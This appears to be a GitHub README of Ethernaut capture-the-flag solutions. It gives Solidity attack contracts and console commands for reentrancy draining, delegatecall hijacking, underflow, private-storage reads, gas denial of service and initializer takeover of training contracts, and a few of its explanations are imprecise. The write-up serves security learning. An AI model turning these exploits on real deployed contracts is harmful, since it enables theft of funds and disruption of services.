# Ethernaut Solutions

Solution to the [Ethernaut](https://ethernaut.openzeppelin.com/) challenges!

## 00 - Hello Ethernaut

For Reference -> [Challenge](./questions/00.Hello_Ethernaut.sol) | [Solution](./answers/00.Hello_Ethernaut.js)

This one's a warm-up. All you have to do is call `info()`, if still confused then check the solution.

## 01 - Fallback

For Reference -> [Challenge](./questions/01.Fallback.sol) | [Solution](./answers/01.Fallback.js)

Here I used the browser's console to solve this challenge. We are going to take the advantage of `receive` function after which some ether could be sent to the contract and we will become the owner.

1. First, let's contribute a small amount less than 0.001 ether after converting ether to wei using `toWei` function within the console itself.

```javascript
    toWei(".0001") // 100000000000000

    await contract.contribute({value: 100000000000000})
```

2. Now, send some ether into the contract by taking advantage of the `receive` function.

```javascript
    await contract.sendTransaction({value: 1})
```

3. Finally, check for the owner whether it's you or not and upon confirmation withdraw the funds

```javascript
    await contract.owner()
    await contract.withdraw()
```

4. At last submit the instance

## 02 - Fallout

For Reference -> [Challenge](./questions/02.Fallout.sol) | [Solution](./answers/02.Fallout.js)

There's a blunder in the constructor name itself as it doesn't matches with the contract name.

Just call the `Fal1out` function and you will be the owner.

```javascript
    await contract.Fal1out()
```

## 03 - Coin Flip

For Reference -> [Challenge](./questions/03.Coin_Flip.sol) | [Solution](./answers/03.Coin_Flip.sol)

This challenge needs us to deploy a attack contract which will always win the coin flip. The contract is already provided in the [solution](./answers/03.Coin_Flip.sol) file. Although, it's well explained under the solution file itself but still let me walk you through the main `attack` function.

The reason why we are able to win the coin flip is because the `blockhash` function is used to calculate the `blockValue` and the `blockhash` function is only able to access the last 256 blocks. So, if we call the `attack` function multiple times in the same block, the `blockhash` function will return the same value and hence the `coinFlip` will be the same.

1. The `attack` function looks like this:

```solidity
    function attack() external {
        uint blockValue = uint(blockhash(block.number-1));
        uint coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        coinflip.flip(side);
    }
```

2. At first, we calculate the `blockValue` by using the `blockhash` function.

3. Then, we calculate the `coinFlip` by dividing the `blockValue` with the `FACTOR` which is 57896044618658097711785492504343953926634992332820282019728792003956564819968

4. Then we calculate the `side` by checking if the `coinFlip` is equal to 1 or not.

5. Finally, we call the `flip` function of the `coinflip` contract with the `side` as the argument.

6. Remember to call the `attack` function 10 times in order to win the challenge.

## 04 - Telephone

For Reference -> [Challenge](./questions/04.Telephone.sol) | [Solution](./answers/04.Telephone.sol)

All we need is to call the `attack` function within the [Solution](./answers/04.Telephone.sol) contract after deploying it.

```solidity
    function attack() public {
        telephone.changeOwner(address(this));
    }
```

The reason this works is because of the vulnerable condition - `(tx.origin != msg.sender)` in the `changeOwner` function of the `Telephone` contract. The `tx.origin` is the original sender of the transaction and `msg.sender` is the current sender of the transaction. So, when we call the `attack` function, the `msg.sender` is the address of the `Solution` contract and the `tx.origin` is the address of the EOA. Hence, the condition `(tx.origin != msg.sender)` is true and the `changeOwner` function is executed.

## 05 - Token

For Reference -> [Challenge](./questions/05.Token.sol) | [Solution](./answers/05.Token.js)

To crack this challenge, one need to have a knowledge of underflows and overflows...
Now, here we have 20 tokens and if we send someone 21 tokens which seems kind of impossible but wait, we are using `uint` here that means it can go negative and hence the balance will be 2^256 - 21 which is a huge number and hence the balance will be huge.

If we look at `transfer` function below:

```solidity
    function transfer(address _to, uint _value) public returns(bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

Here, if we call the `transfer` function with `_to` as someone's address and `_value` as 21, then `20 - 21 -> -1 <=> 2^256` and hence the balance will be huge.

1. Let's first check our current balance which gonna be 20 tokens

```javascript
    await contract.balanceOf(player)
```

2. Now transfer 21 tokens to someone's address

```javascript
    await contract.transfer("anyone-address", 21)
```

## 06 - Delegation

For Reference -> [Challenge](./questions/06.Delegation.sol) | [Solution](./answers/06.Delegation.js)

This is an interesting challenge and for this you need to have certain knowledge of how delegate calls works and can be manipulated in phase of vulnerability.
An interesting activity is provided in [Bonus](/Ethernaut/Bonus/DelegateCalls/) section which will help you understand a little concept about delegate calls. Research on your own basis will be helpful.

Now, let's come to the challenge:

1. First, we need to check which contract we are interacting with - `Delegate` or `Delegation`.

```shell
    contract.abi
```

2. Now we will make a variable that contains our call to `pwn` and then that call will send through an transaction to the `Delegation` contract. As `Delegation` contract contains a `fallback` function that usually take any transaction and then delegate it to the `Delegate` contract.

```javascript
    var pwned = web3.utils.keccak256("pwn()")
    await contract.sendTransaction(pwned)
```

3. At last, check the owner and submit!

```javascript
    await contract.owner()
```

## 07 - Force

For Reference -> [Challenge](./questions/07.Force.sol) | [Solution](./answers/07.Force.sol)

At first, this challenge seems confusing but as you dig a little bit deeper you will find `selfdestruct` function which is the key to solve this challenge. What `selfdestruct` do is, it will destroy the contract (where it is used) and send all the ether to the address provided as an argument.

1. First, deploy the contract provided in [Solution](./answers/07.Force.sol) file. The contract will take the address of the victim contract as an argument.

```solidity
    // SPDX-License-Identifier: MIT
    pragma solidity ^0.8.0;

    interface Force{}

    contract Hack{
        Force public force;

        constructor(address _victim) {
            force = Force(payable(_victim));
        }

        // This is the attack function, and make sure it be payable
        function attack() external payable{
            selfdestruct(payable(address(force)));
        }
    }
```

2. Now, call the `attack` function which will destroy the contract and send all the ether to the victim contract.

3. At last, check the balance of the victim contract and submit!

```javascript
    await contract.balance()
```

## 08 - Vault

For Reference -> [Challenge](./questions/08.Vault.sol) | [Solution](./answers/08.Vault.js)

This challenge has to do with private Storages, thus it be better to get a understanding of it and you can also refer it through one of the [bonuses](./Bonus/PrivateStorages) section.

Let's come to this challenge, first thing is - `private` doesn't mean your data is secure, it just means that it's not accessible through the contract's ABI. But, it can still be accessed by other contracts. Thus, we will be using `getStorageAt` function to get the value of the `password` variable.

1. First initialize the address of our instance in a separate variable

```javascript
    var addr = 'your contract address'
```

2. Now we will get storage of slot1

```javascript
    await web3.eth.getStorageAt(addr, 1)
```

3. Copy that hexadecimal value you got from 2nd step, and pass it here!

```javascript
    await contract.unlock("your_hexadecimal_value")
```

## 09 - King

For reference -> [Challenge](./questions/09.King.sol) | [Solution](./answers/09.King.sol)

This is an interesting challenge and also based on a real dapp which kind of did the same thing. The challenge is all about disrupting the system and become the king which can't be de-throned.

All you need to know is how the `fallback` function works and some details about `transfer` function in solidity. Here, the issue is in `receive` function which is using `transfer` function to send the ether to the previous king. The `transfer` function has a gas limit of 2300 and if the gas limit is exceeded then the transaction will be reverted. And that's the key to solve this challenge.

```solidity
    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }
```

1. Deploy the contract provided in [Solution](./answers/09.King.sol) file with the address of the king contract as an argument and also send the ether more than the current highest value.

2. You will made king of the contract and now whenever someone tries to become the king, the transaction will be reverted as the gas limit will exceed and no one can replace you.

## 10 - Re-entrancy

For reference -> [Challenge](./questions/10.Re-entrancy.sol) | [Solution](./answers/10.Re-entrancy.sol)

This challenge is all about re-entrancy attack and how it can be prevented. The `withdraw` function is vulnerable to re-entrancy attack as it first sends the ether to the caller and then updates the balance. So, if the caller is a malicious contract, it can call the `withdraw` function again and again before the balance is updated.

```solidity
    function withdraw(uint _amount) public {
        if(balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value:_amount}("");
            if(result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }
```

To hack this, we will deploy a malicious contract that will call the `withdraw` function again and again before the balance is updated.

1. Deploy the contract provided in [Solution](./answers/10.Re-entrancy.sol) file.

2. Call the `hack` function and also send 0.001 ether to it. The `hack` function will send 0.001 ether to the malicious contract and will withdraw it immediately, `withdraw()` will trigger the receive function and then the magic starts!

```solidity
    // Send 0.001 ether and withdraw immediately
    // This will trigger the receive function when withdraw() is called on Reentrance contract
    function hack() public payable {
        reentrance.donate{value: msg.value}(address(this));
        // This will trigger the receive() the function
        reentrance.withdraw(msg.value);

        require(address(reentrance).balance == 0, "FAILED!!!");

        // Recover sent ether
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {
        uint256 balance = reentrance.balanceOf(address(this));

        // Try to withdraw the smallest amount possible, so that the transaction does not revert
        uint256 withdrawableAmount = balance < 0.001 ether
            ? balance
            : 0.001 ether;

        // Stop withdrawing if the contract balance is 0, so that the transaction does not revert
        if (withdrawableAmount > 0) {
            reentrance.withdraw(withdrawableAmount);
        }
    }    
```

## 11 - Elevator

For reference -> [Challenge](./questions/11.Elevator.sol) | [Solution](./answers/11.Elevator.sol)

This challenge gives a knowledge about how interfaces could be vulnerable and thus manipulated. The `Elevator` contract contains an interface `Building` which has a function `isLastFloor`, all we have to do is create another contract named as `Building` and present it with the `isLastFloor` function that returns `false` at first and returns `true` upon calling it again. This is done because the `goTo` function demands such functionality from that `floor` parameter which be provided to it, Take a look at `Elevator` contract:

```solidity
    contract Elevator {
        bool public top;
        uint public floor;

        function goTo(uint _floor) public {
            Building building = Building(msg.sender);

            if (! building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
            }
        }
    }
```

Thus, we be creating a contract named as `Building` and providing it with both `isLastFloor` and `goTo` functions which will help us in reaching the top floor. The contract is provided in the [Solution](./answers/11.Elevator.sol) file, and here's a glimpse of that `isLastFloor` function I was talking about:

```solidity
    bool public toggle = true;

    function isLastFloor(uint) public returns(bool){
        toggle = !toggle;
        return toggle;
    }
```

Look at the way `isLastFloor` is implemented above, as when `goTo` function will call it once it will return `false` the first time and then will return true.

Hence, deploy the solution contract and call `goTo`

## 12 - Privacy

For reference -> [Challenge](./questions/12.Privacy.sol) | [Solution](./answers/12.Privacy.sol)

This challenge is all about how private variables can be accessed and thus when a storage variable is marked with keyword `private`, it doesn't means that data cannot be accessed. The `Privacy` contract looks like this:

```solidity
    contract Privacy {
        bool public locked = true;
        uint256 public ID = block.timestamp;
        uint8 private flattening = 10;
        uint8 private denomination = 255;
        uint16 private awkwardness = uint16(now);
        bytes32[3] private data;

        constructor(bytes32[3] memory _data) public {
            data = _data;
        }

        function unlock(bytes16 _key) public {
            require(_key == bytes16(data[2]));
            locked = false;
        }
    }
```

If you notice, to unlock the `locked` i.e make it true...we need to pass the `bytes16` key which is the last elementof the `data` array. Now, let's see on which slot our required `key` resides:

```typescript
| Slot 0 | bool locked |
| Slot 1 | uint256 ID |
| Slot 2 | uint8 flattening + unit8 denomination + uint16 awkwardness |
| Slot 3 | bytes32 data[0] |
| Slot 4 | bytes32 data[1] |
| Slot 5 | bytes32 data[2] |
```

Hence it lies on 5th slot, so all we need to do is get the storage of 5th slot and pass it to the `unlock` function. But there's one more thing i.e the value we get in slot 5th is a 32-bytes value whereas unlock requires a 16-bytes value, that's why we be using another contract to solve this problem.

***Note: If you having any trouble in understanding the private storages and how they work, refer to the [Bonus](./Bonus/PrivateStorages/) section.***

Now, let's solve this challenge:

1. Deploy the contract provided in [Solution](./answers/12.Privacy.sol) file.

2. Get the key from the 5th slot, by using the `web3.eth.getStorageAt` function in your browser's console.

```javascript
    await web3.eth.getStorageAt(contract.address, 5, console.log) // console.log will print the key such that we can copy it down
```

3. Now, pass the key as an argument to `attack` function. This will first turn our 32-bytes value to 16-bytes and then call the `unlock` function of `Privacy` contract.

```solidity
    function attack(bytes32 _slotValue) external {
        bytes16 key = bytes16(_slotValue);
        target.unlock(key); // where target is the instance of Privacy contract
    }
```

4. At last check whether the `locked` is true or not and submit!

```javascript
    await contract.locked()
```

## 13 - Gatekeeper One

For reference -> [Challenge](./questions/13.Gatekeeper_One.sol) | [Solution](./answers/13.Gatekeeper_One.sol)

This challenge was quite difficult to understand in first go, but that's ok it's part of the process. you need to get familiar with certain topics like:

- Bit masking
- tx.origin vs msg.sender
- opcodes
- what is gasleft()

Coming to the question, one need to break 3 gates in order to pass this challenge.

`GateOne`: You must have seen it before and we know that in order to break it, all we have to do is call the `enter` function from some other contract.

```solidity
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
```

`GateTwo`: This gonna use up some brute force technique, mainly using `gasleft()` in a way such that we meet the required condition.

```solidity
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }
```

`GateThree`: Need an understanding of conversion between uint and bytes, bit masking and some other math stuff!

```solidity
    modifier gateThree() {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }
```

To solve the third gate, you can see our key is hidden in last condition which is `uint16(uint160(tx.origin))`. Here, `tx.origin` will be our wallet address, let's suppose mine is `0x9aFE8fCbc8465b73319520AFEDba0C0179f26D97` which is 20 bytes (each byte covering up 2 characters)

Thus, according to the last condition:

```typescript
    uint32((uint64(_gateKey))) == uint16((uint160(tx.origin))) ==  0x6D97 == 0x00006D97
                                                                   uint16      uint32
```

***Note: when a 20 bytes address is converted into a lower bytes, the left side bytes be the one to be removed.***

Now let's go through the first part of gate three, the condition says -> `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))` which means our key should be same in both uint16 and uint32. Thus, `0x6D97 == 0x00006D97` which is true.

Here comes the 2nd part of gate three, the condition says -> `uint32(uint64(_gateKey)) != uint64(_gateKey)` which means our uint32 key shouldn't be equal to uint64 key. The only way it could be possible if we mask our key of 8 bytes (i.e uint64) with `0xFFFFFFFF0000FFFF` which will satisfy that condition.
After masking, our key now is `0xEDba0C0100006D97` which is 8 bytes. Thus, we know with what to mask our key now -> `0xFFFFFFFF0000FFFF`

At last, deploy the contract provided in [Solution](./answers/13.Gatekeeper_One.sol) file. Here's the main `hack` function and a detailed reason and solution in tackling the `gateTwo`:

```solidity
    function hack(uint start, uint end) public{
        // Now what's we doing here, just using a brute force technique
        // Here 8191 will be the multiplied by any number greater than 3 such that enough gas is provided for this function to call, and then 150 is added, just to make it more precise for some gasleft context, and then hit and trial thing is done with for loop iterations!!

        // Make sure to try different value of 'start' and 'end' ranging from 0 to 500
        for(uint i = start; i < end; i++){
            (bool result, bytes memory data) = address(keeperOne).call{gas: i + 150 + 8191*3}(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (result){
                break;
            }
        }
    }
```

Call the `hack` function and submit the instance...Cheers!

## 14 - Gatekeeper Two

For reference -> [Challenge](./questions/14.Gatekeeper_Two.sol) | [Solution](./answers/14.Gatekeeper_Two.sol)

Just like the previous challenge, we have to pass through three gates in order to solve this challenge. First gate is similar to the previous challenge i.e call the `enter` function through different contract. Now let's look at second gate modifier:

```solidity
    modifier gateTwo() {
        uint x;
        assembly { x := extcodesize(caller()) }
        require(x == 0);
        _;
    }
```

Here, the `extcodesize` function is used to get the size of the code at the address provided as an argument. If the size is 0, then the address is an EOA otherwise it's a contract. But we can't really use an EOA as then the other gates won't be cleared away. Thus, there's a trick and a thing to remember i.e when a contract is deployed and it's constructor is called then the `extcodesize` will return 0. Thus, this gate is solved

Now, let's look at the third gate modifier:

```solidity
    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }
```

Here, our `gateKey` should be '^' or 'XOR' of `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))` such that it could be equal to `type(uint64).max` i.e `0xFFFFFFFFFFFFFFFF`. Do check about XOR if you are not familiar with it.

So in order to solve this gate, we be using `~` which is a bitwise NOT operator and helps in finding the complement of any particular value. The reason we need a complement here is, In the equation A ^ B = X, our X is clear i.e '0xFFF...', A is clear i.e keccak hash of msg.sender which be the address of the contract we be using to call the `enter` function of `Gatekeeper Two` contract. The only value which is unknown is our gateKey and obviously it be the complement of A, thus our key is `~bytes8(keccak256(abi.encodepacked(address(this))))`

Before deploying our [solution](./answers/14.Gatekeeper%20Two.sol) let's look at it:

```solidity
    contract Attack{
        // Here, I am solving this using my first method
        // But you can consider even use this code -> bytes8 key = bytes8(keccak256(abi.encodePacked(address(this)))) ^ 0xffffffffffffffff;
        bytes8 key = ~bytes8(keccak256(abi.encodePacked(address(this))));

        constructor(address victim){
            // Here we called the function at the time of deployment, thus bypassing the second gate!
            GateKeeperTwo(victim).enter(key);
        }
    }
```

It will automatically call the `enter` function as you deploy it...Cheers!

## 15 - Naught Coin

For reference -> [Challenge](./questions/15.Naught_Coin.sol) | [Solution](./answers/15.Naught_Coin.js)

In this challenge, we got a contract with some tokens minted in our name in a large quantity called Naught Coin. Our task is to send these tokens to some random address but the problem is this contract have applied a so called modifier `lockTokens` which prevents us from taking out our tokens for around 10 years.

```solidity
    uint public timelock = block.timestamp + 10 * 365 days;

    modifier lockTokens() {
        if (msg.sender == player) {
            require(block.timestamp > timelock);
            _;
        } else {
            _;
        }
    }
```

In order to solve this challenge, we be using two functions related to ERC20 contract i.e `approve` and `transferFrom`. The `approve` function is used to approve the any contract to spend some tokens on our behalf and the `transferFrom` function is used to transfer the tokens from our account to some other account. That's it!

Just follow the steps provided in the [Solution](./answers/15.Naught_Coin.js) file and you are good to go!

## 16 - Preservation

For reference -> [Challenge](./questions/16.Preservation.sol) | [Solution](./answers/16.Preservation.sol)

This challenge is related to `delegate calls` and their common problems which developers make, it be good to have your hands on the [bonus section](./Bonus/DelegateCalls/)

Let's come to the challenge now, the problem is how state variables are strucutred between both `Preservation` and `LibraryContract` i.e Preservation is acting like a proxy and using the logic from LibraryContract by using the function `setTime` and targeting the `storedTime` variable. But if you take a look, `storedTime` is present on slot 3 in `Preservation` contract whereas it's present on slot 0 in `LibraryContract` which creates the vulnerability.

Thus, we be using the hack contract provided in the [Solution](./answers/16.Preservation.sol) file and calling the `setFirstTime` function with our contract's address as the argument i.e `uint256(uint160(address(this)))` in the console which will set `address public timeZone1Library` in `preservation` contract as our hack contract's address and thus calling `setFirstTime` again with any random integer will turn us the owner of preservation contract. You will get all this with ease if you go through that bonus section, saying it again!

## 17 - Recovery

For reference -> [Challenge](./questions/17.Recovery.sol) | [Solution](./answers/17.Recovery/)

In this challenge, we need to recover funds from a contract whose address we don't know. Now that's simple if you know about [Etherscan](https://etherscan.io/) and how it works. Etherscan is a block explorer for the Ethereum blockchain and it provides a lot of information about the transactions and contracts on the Ethereum blockchain. We can use Etherscan to get the address of the contract. Other way is to use the `instance-address` and `nonce` to get it, explained [here](./answers/17.Recovery/17.Recovery.js).

After getting the contract address, all you need is to deploy the contract provided [here](./answers/17.Recovery/17.Recovery.sol) and call the `attack` function which will call the `selfdestruct` function of the contract and send all the ether to the our address.

## 18 - Magic Number

For reference -> [Challenge](./questions/18.Magic_Number.sol) | [Solution](./answers/18.Magic_Number.js)

This challenge is kind of hard and need one to have a bit understanding of how EVM works and about opcodes. Thus, the following video will definitely help in this as I myself got a lot of help from there. It be kind of a long one, about 43 minutes but be worth it:

[D-Squared - Magic Number](https://www.youtube.com/watch?v=FsPWuKK8mWI)

## 19 - Alien Codex

For reference -> [Challenge](./questions/19.Alien_Codex.sol) | [Solution](./answers/19.Alien_Codex.js)

This challenge is all about accessing that storage which wasn't accessible to us and then become the owner of the contract. The vulnerability clearly lies in `retract` function:

```solidity
    function retract() contacted public {
        codex.length--;
    }
```

The thing is, `codex` is a dynamic array and it's empty at the start. So, if we call the `retract` function, it will reduce the length of the array by 1 and hence the length will be `2^256 - 1` which is a huge number. Thus, we got the access to the whole storage.

Before calling `retract`, the owner variable was present right in the 0th slot of the storage with boolean `contact` which is false right now. And, `codex` dynamic array is present at 2nd slot i.e it's length is at 1st slot but the actual data starts from `keccak256(bytes32(slot_at_which_array_length_is_stored))`. i.e 1st slot. Further values are then stored at `keccak256(bytes32slot_at_which_array_length_is_stored)) + 1`, `keccak256(bytes32(slot_at_which_array_length_is_stored)) + 2` and so on.

So, now the question is when we got the access of whole array by calling the `retract` function...how we gonna change the owner? As according to us, the owner is present at 0th slot but we can't change it directly. Although, we got another function present in `Alien Codex` contract which is `revise`. This function lets us change any value in the array if we know it's index. Thus, we need to find the index of the owner in the array and then change it to our address. But there's a catch, index ain't 0 as we don't know from where the array's data starts, Let's explain this with a little exercise:

Let's assume that the maximun slots of storage are `10` and `keccak256(bytes32(1))` is `7`.

| slot | variables               | codex       |
| ---- | ----------------------- | ----------- |
| 0    | owner                   | codex[3]    |
| 1    | codex.length (==9)      | codex[4]    |
| 2    |                         | codex[5]    |
| 3    |                         | codex[6]    |
| 4    |                         | codex[7]    |
| 5    |                         | codex[8]    |
| 6    |                         | unreachable |
| 7    | `keccak256(bytes32(1))` | codex[0]    |
| 8    |                         | codex[1]    |
| 9    |                         | codex[2]    |

Here, codex.length is 9 as one slot consists of the length value itself which we don't know. And previously, as length of the codex was stored in 1st slot, according to above assumption `keccak256(bytes32(1))` is `7`. Thus, the data at 7th slot became the 0 index of codex array and next slot becomes the 1 index and so on.

As we can see in above assumption, the owner variable is present at 3rd index...thus equation comes out to be, `x = 10 - 7` i.e `Owner's index = Total number of slots - slot from where the codex data starts`. That's what gonna solve this challenge.

Now, let's solve this:

1. In the browser's console, first we will try making `contact` true as it's required in calling other functions due to the `contacted` modifier. Thus, we will call `makeContract` function first.

```javascript
    await contract.makeContract()
```

2. Then we will be calling `retract` function, and you know why!

```javascript
    await contract.retract()
```

3. Now, we will get the slot from where the actual codex data starts. We know the length of the codex array is stored in 1st slot then:

```javascript
    // Here number 1 is converted to bytes32
    const mapLengthAddress = "0x0000000000000000000000000000000000000000000000000000000000000001";

    // Getting the slot from where the codex data starts i.e keccak256(bytes32(1))
    const mapStartSlot = BigNumber.from(ethers.utils.keccak256(mapLengthAddress));
```

4. Now, we will be getting the index of owner slot and also we know the equation.

```javascript
    // Getting the total number of slots
    const NUMBER_OF_SLOTS = BigNumber.from("2").pow("256");

    // Getting the index of owner by the equation explained above
    const ownerPositionInMap = NUMBER_OF_SLOTS.sub(mapStartSlot);
```

5. Now, we got the index of owner...finally it's time to change it to our address using `revise` function.

```javascript
    // Padding our address with 0s to make it 32 bytes
    const parsedAddress = ethers.utils.hexZeroPad(player.address, 32);

    // Using revise function by providing index and our address
    await contract.revise(ownerPositionInMap, parsedAddress);
```

6. At last, check the owner and submit!

```javascript
    await contract.owner()
```

***Note: `code.length--` only works with solidity versions prior to 0.6.0, for versions after that you need to use `code.pop()`. Also, from 0.8.0 solidity implemented underflow/overflow checks right in the compiler.***

## 20 - Denial

For reference -> [Challenge](./questions/20.Denial.sol) | [Solution](./answers/20.Denial.sol)

This challenge needs us to not let owner withdraw the funds by being it's partner. Let's take a look on the vulnerability function:

```solidity
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        partner.call{value: amountToSend}("");
        payable(owner).transfer(amountToSend);
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] += amountToSend;
    }
```

Here, one can notice that the line `partner.call{value: amountToSend}("");` is do transfering some value but not checking whether the call was successful or not. Thus, we can take an advantage of this by emptying up the gas within that function itself which won't let the owner withdraw any funds.
Now, we will be creating a Attack contract which will be containing a `fallback` function that will do the task of receiving the ether when sent to it. Somehow, we will create some logic within the `fallback` function which will use up all the gas. Here's that function and the logic which is easily understandable if you know about infinite loops:

```solidity
    contract Attack {
        fallback() external payable {
            // Infinite loop to use up all the gas
            while (true) {

            }
        }
    }
```

Now, all we have to do is deploy this contract or you can take the one present in the [Solution](./answers/20.Denial.sol) file and copy its address.

Then call these commands in your browser's console:

```javascript
    const copied_address = "your_attack_contract_address"
    await contract.setWithdrawPartner(copied_address)

    // Now, call the withdraw function
    await contract.withdraw()
```

## 21 - Shop

For reference -> [Challenge](./questions/21.Shop.sol) | [Solution](./answers/21.Shop.sol)

This is an easy one, so here we need to disrupt the shop by purhcasing the item at a price less than the actual price. The vulnerability lies in the `buy` function as it checks the price 2 times - one within the condition and other inside that condition block after changing `isSold` to true:

```solidity
    interface Buyer {
        function price() external view returns (uint);
    }

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();    
        }
    }
```

Thus, all we need to solve this challenge is to create a contract named Buyer with the help of provided interface, and create the logic of `price` function such that we get our item at a price less than the actual price. The contract provided in the [Solution](./answers/21.Shop.sol) file. Let's look at the `price` function there:

```solidity
    function price() external view returns (uint) {
        if (target.isSold() == false) {
            return 101;
        } else {
            return 1;
        }
    }
```

First condition will let us inside the `if` block of the `buy` function and then the 2nd condition will change the price to 1 which is less than the actual price. Now, deploy the contract and call the `attack` function...submit!

## 22 - DEX

For reference -> [Challenge](./questions/22.DEX.sol) | [Solution](./answers/22.DEX.js)

This challenge is quite interesting as we are provided a kind of DEX and two token types, tokenA and tokenB. Our task is to make the balance of some token in DEX to be 0 which usually doesn't happen as DEX are designed this way. But here, we gonna take the advantage of price function i.e `getSwapPrice`:

```solidity
    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) public view returns (uint256) {
        return ((amount * IERC20(to).balanceOf(address(this))) / IERC20(from).balanceOf(address(this)));
    }
```

As there are no floating numbers in Solidity, results are rounded, and it happens that sometimes they are rounded down. So, swapping them back and forth with work for us. Will advise to check this [article](https://dev.to/nvnx/ethernaut-hacks-level-22-dex-1e18) which have explained this challenge in depth as I got a lot of help from there!

## 23 - DEX Two

For reference -> [Challenge](./questions/23.DEX_Two.sol) | [Solution](./answers/23.Dex%20Two/)

This challenge is similar to the previous one, with the difference that this one omits the following validation when swapping tokens:

```solidity
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
```

This means we can swap any token. So, we can create a random token. Send it to the contract, and swap it for the ones we're interested in. Also check out this [article](https://dev.to/nvnx/ethernaut-hacks-level-23-dex-two-4424) if you missed previous challenge or still confused about the solution!

## 24 - Puzzle Wallet

For reference -> [Challenge](./questions/24.Puzzle_Wallet.sol) | [Solution](./answers/24.Puzzle_Wallet.js)

This solution is widely explained in the solution itself, with those links. So, I will advise you to go through that and then try to solve this challenge. It's a bit tricky but you will get it!

## 25 - Motorbike

For reference -> [Challenge](./questions/25.Motorbike.sol) | [Solution](./answers/25.Motorbike/)

This challenge is a good one and it be easy if you know about the `UUPS`, `Proxies` and `delegate calls`. We are given two contracts, one is Engine (Proxy) and other is Motorbike (logic). The goal is to disrupt the Motorbike by changing it's owner thus the logic can't be upgraded anymore.

**Note: Do understand the code, you can even take a look at this [video](https://youtu.be/D7IfmkINYJ0?t=386)**

The vulnerability lies in the `initialize` function of the Motorbike contract:

```solidity
    function initialize() external initializer {
        horsepower = 1000;
        upgrader = msg.sender;
    }
```

Usually, in UUPS or proxies like these upgrader is allowed to call the initliaze function only once. But here, the `initialize` function is public and can be called by anyone. Thus, we can change the owner of the Motorbike contract by calling the `initialize` function. A detailed step by step solution is provided in the [Solution](./answers/25.Motorbike/25.Motorbike.js) file.

## 26 - DoubleEntryPoint

For reference -> [Challenge](./questions/26.DoubleEntryPoint.sol) | [Solution](./answers/26.DoubleEntryPoint/)

This challenge teaches us to how to setup a Forta bot, thus we created one [here](./answers/26.DoubleEntryPoint/26.DetectionBot.sol) which will be deployed and if you notice that the constructor needs an address which we will get from running the following command in the browser's console:

```javascript
    const cryptoVaultAddr = await contract.cryptoVault()
```

Also, copy the address of the bot contract and store in a variable.

```javascript
    const detectionBotAddr = "your_bot_contract_address"
```

Setting up the function part of the call data - Copy the down code and paste it in the console

```javascript
    const func = {
        "inputs": [
        { 
            "name": "detectionBotAddr",
            "type": "address"
        }
        ],
        "name": "setDetectionBot", 
        "type": "function"
    };
```

Next, we will define the parameters of the call, which is where we will pass in our detection bot address

```javascript
    const params = [detectionBotAddr]
```

Now just concatenate our calldata

```javascript
    const data = web3.eth.abi.encodeFunctionCall(func, params)
```

Finally, we send our transaction to set our bot and finally submit

```javascript
    await web3.eth.sendTransaction({
        from: player,
        to: cryptoVaultAddr,
        data: data
    })
```

Refer these links for a better explaination:

1. [coinmonks_medium](https://medium.com/coinmonks/26-double-entry-point-ethernaut-explained-f9c06ac93810)
2. [daltyboy11_github](https://daltyboy11.github.io/every-ethernaut-challenge-explained/#doubleentrypoint)

## 27 - Good Samaritan

For reference -> [Challenge](./questions/27.Good_Samaritan.sol) | [Solution](./answers/27.Good%20Samaritan.sol)

Quite a easy and interesting challenge. Here, we are given three contracts i.e `GoodSamaritan`, `Coin` and `Wallet`. The GoodSamaritan contract will deploy new instances of the Coin and the Wallet (the GoodSamaritan will be the owner) contract respectively.

Think `GoodSamaritan` a wealthy individual who wants to help the community by donating 10 coins whoever requests via `requestDonation()` function.

```solidity
    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
```

As you can see it uses [donate10](https://github.com/0xScratch/Web3_Security_CTFs/blob/3d0991e792aafdfbc7443ff2aa71cc3121deb2ef/Ethernaut/questions/27.Good%20Samaritan.sol#L92) function of the wallet contract which checks whether the coins (that are being donated) are enough (>=10) or not. If there is not enough coins, it will check if the reverted message/error is `NotEnoughBalance()` by the `if` condition `keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)` and then transfer the remaining coins to the requester using [transferRemainder()](https://github.com/0xScratch/Web3_Security_CTFs/blob/3d0991e792aafdfbc7443ff2aa71cc3121deb2ef/Ethernaut/questions/27.Good%20Samaritan.sol#L102) function which uses [transfer](https://github.com/0xScratch/Web3_Security_CTFs/blob/3d0991e792aafdfbc7443ff2aa71cc3121deb2ef/Ethernaut/questions/27.Good%20Samaritan.sol#L54) function of the Coin contract under the hood.

